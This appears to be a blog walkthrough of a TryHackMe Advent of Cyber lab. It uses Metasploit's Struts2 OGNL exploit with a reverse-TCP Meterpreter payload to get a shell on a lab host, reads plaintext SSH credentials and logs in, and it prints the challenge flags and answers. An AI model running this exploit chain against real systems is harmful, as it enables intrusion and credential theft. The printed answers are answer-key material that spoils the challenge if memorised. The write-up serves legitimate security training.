---
title: "Advent of Cyber Day 10 Metasploit-a-ho-ho-ho"
author: Ludovic COULON
date: 2020-05-08
hero: ./images/hero.png
excerpt: "Advent of Cyber Day 10 Metasploit-a-ho-ho-ho"
secret: true
---

[TryHackMe | Advent of Cyber](https://tryhackme.com/room/25daysofchristmas)

Hi Lindsey here. I've been a great Elf all year, but there was one incident and now I think I'm on Santa's naughty list.

What? You didn't think us elves got presents too? Well we do and we get first pick of the pressies!

Can you help me hack into Santa's system that keeps track of the naughty and nice people to see if I am on it?

![https://i.imgur.com/ODZrb5R.png](https://i.imgur.com/ODZrb5R.png)

Check out the [blog post](https://blog.tryhackme.com/metasploit/) shown above to help you on this task.

## Setup

On the title of this box it says "Struts", so I search if there is some exploits in the metasploit framework and spoiler alert there is one.

![https://i.imgur.com/6PI0zyZ.png](https://i.imgur.com/6PI0zyZ.png)

Now that we have the exploit let's use it !

```bash
use exploit/multi/http/struts2_content_type_ognl
```

Now put the correct HOST and port for the exploit

```bash
set RHOSTS 10.10.21.228 # Host of the target box
set RPORT 80 # There is no SSL (https)
set TARGETURI /showcase.action # The path to a struts application action (default path)
```

Now the fun stuff, the reverse tcp meterpreter :)

```bash
use linux/x86/meterpreter/reverse_tcp
set LHOST IP # Ip of your kali machine (openvpn ip)
set LPORT 4444 # You can put anything there.
```

After all the configuration you need to go back to the previous exploit (struts2)

```bash
use multi/http/struts2_content_type_ognl
set PAYLOAD linux/x86/meterpreter/reverse_tcp # Link the reverse TCP to the struts exploit)
exploit
```

## 1 Compromise the web server using Metasploit. What is flag1?

On the question we have the name of the flag so let's find it !

```bash
meterpreter > shell
Process 63 created.
Channel 6 created.
find / | grep -i "flag1"
/usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
^C
Terminate channel 6? [y/N]  y
meterpreter > cat /usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
THM{3ad96bb13ec963a5ca4cb99302b37e12}
```

![https://i.imgur.com/CC7mRJq.png](https://i.imgur.com/CC7mRJq.png)

```bash
THM{3ad96bb13ec963a5ca4cb99302b37e12} # flag
```

## 2 Now you've compromised the web server, get onto the main system. What is Santa's SSH password?

On the question we have the name 'santa' let's see if there is some users on the /home directory

```bash
meterpreter > "cd /home"
meterpreter > "ls"
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2019-12-08 16:12:45 -0500  santa

meterpreter > "cd santa"
meterpreter > ls
Listing: /home/santa
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  30    fil   2019-12-08 16:12:44 -0500  "ssh-creds.txt"

meterpreter > "cat ssh-creds.txt"
santa:rudolphrednosedreindeer
```

```bash
rudolphrednosedreindeer # flag
```

## 3 Who is on line 148 of the naughty list?

Now that we have the ssh creds on the santa's accont let's use it !

```bash
ssh santa@10.10.21.228
password: rudolphrednosedreindeer
```

[How to "grep" out specific line ranges of a file](https://stackoverflow.com/a/2914269)

```bash
[santa@ip-10-10-21-228 ~]$ sed '148!d' naughty_list.txt
Melisa Vanhoose
```

## 4 Who is on line 52 of the nice list?

```bash
[santa@ip-10-10-21-228 ~]$ sed '52!d' nice_list.txt
Lindsey Gaffney
```
